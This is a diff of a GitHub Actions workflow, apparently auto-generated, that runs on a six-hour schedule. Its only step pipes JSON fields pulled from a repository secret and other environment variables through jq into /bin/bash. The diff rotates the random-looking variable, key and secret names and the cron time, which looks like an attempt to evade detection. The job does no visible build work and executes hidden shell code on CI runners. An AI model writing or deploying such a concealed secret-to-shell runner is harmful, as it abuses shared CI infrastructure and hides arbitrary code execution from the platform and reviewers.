@@ -1,27 +1,27 @@
 name: shiyongxing6715
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 0/6 * * *'
+    - cron: '15 3/6 * * *'
 
-jobs:  # 25571
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: shiyongxing6715
         env:
-          hej3920: ${{ secrets.hej3920 }}
+          rnku19935: ${{ secrets.rnku19935 }}
         run: |
-          echo $hej3920 | jq -r .jv91527 | /bin/bash
-          echo $b0852 | jq -r .sx45 | /bin/bash
-          echo $bs85769 | jq -r .dtg87952 | /bin/bash
-          echo $r94 | jq -r .qwxw122 | /bin/bash
-          echo $lb03435 | jq -r .lkw7 | /bin/bash
-          echo $lm3 | jq -r .futdh0 | /bin/bash
-          echo $uxaz1739 | jq -r .hj0 | /bin/bash
-          echo $blkau3252 | jq -r .txto90 | /bin/bash
-          echo $bbdv20 | jq -r .qgobo133 | /bin/bash
-          echo $tw20713 | jq -r .uwsn90975 | /bin/bash
-          echo $otm029 | jq -r .ugle6 | /bin/bash
+          echo $rnku19935 | jq -r .yrhxk1766 | /bin/bash
+          echo $rjxuj93127 | jq -r .i6 | /bin/bash
+          echo $fjmyo5491 | jq -r .py61 | /bin/bash
+          echo $srhh4 | jq -r .b8962 | /bin/bash
+          echo $w46 | jq -r .nfvf75069 | /bin/bash
+          echo $h68659 | jq -r .ehwlr6476 | /bin/bash
+          echo $omt1 | jq -r .nbjb39511 | /bin/bash
+          echo $sqims02539 | jq -r .yz62 | /bin/bash
+          echo $ga67 | jq -r .dv2680 | /bin/bash
+          echo $u568 | jq -r .bck015 | /bin/bash
 
